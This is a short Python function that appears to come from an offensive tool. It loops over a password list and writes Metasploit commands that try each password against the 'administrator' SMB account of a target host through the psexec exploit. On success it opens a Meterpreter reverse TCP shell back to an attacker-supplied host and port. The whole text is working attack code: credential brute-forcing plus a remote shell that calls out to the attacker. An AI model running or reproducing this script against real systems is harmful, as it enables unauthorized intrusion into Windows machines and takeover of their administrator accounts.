#try every password
#execute a psexec programe in remote host

def smbbrute(configfile,targethost,passwordfile,lhost,lport):
	username = 'administrator'
	pf = open (passwordfile,'r')
	for line in pf.readlines():
		password = line.strip('\n').strip('\r')
		configfile.write('use exploit/windows/smb/psexec\n')
		configfile.write('set SMBUser '+str(username)+'\n')
		configfile.write('set SMBPass '+str(password)+'\n')
		configfile.write('set RHOST '+str(targethost)+'\n')
		configfile.write('set PAYLOAD '+'windows/meterpreter/reverse_tcp\n')
		configfile.write('set LPORT '+str(lport)+'\n')
		configfile.write('set LHOST '+str(lhost)+'\n')
		configfile.write('exploit -j -z\n')
		
